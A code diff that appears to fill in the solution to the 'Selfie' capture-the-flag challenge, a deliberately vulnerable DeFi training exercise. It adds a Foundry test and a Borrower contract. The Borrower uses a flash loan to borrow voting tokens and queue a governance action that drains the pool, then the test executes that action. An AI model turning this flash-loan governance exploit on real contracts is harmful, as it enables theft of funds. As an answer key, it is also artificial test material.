@@ -62,7 +62,13 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Borrower b = new Borrower();
+        pool.flashLoan(b, address(token), TOKENS_IN_POOL, abi.encodeWithSelector(pool.emergencyExit.selector, recovery));
+
+        // Two days later
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(1);
+        b.recover(token, recovery);
     }
 
     /**
@@ -72,5 +78,23 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract Borrower is IERC3156FlashBorrower {
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata data) external returns (bytes32) {
+        SelfiePool pool = SelfiePool(msg.sender);
+        DamnValuableVotes token = DamnValuableVotes(address(pool.token()));
+        token.delegate(address(this));
+        pool.governance().queueAction(address(pool), 0, data);
+        token.approve(address(pool), amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function recover(DamnValuableVotes token, address recovery) public {
+        token.transfer(address(recovery), token.balanceOf(address(this)));
     }
 }
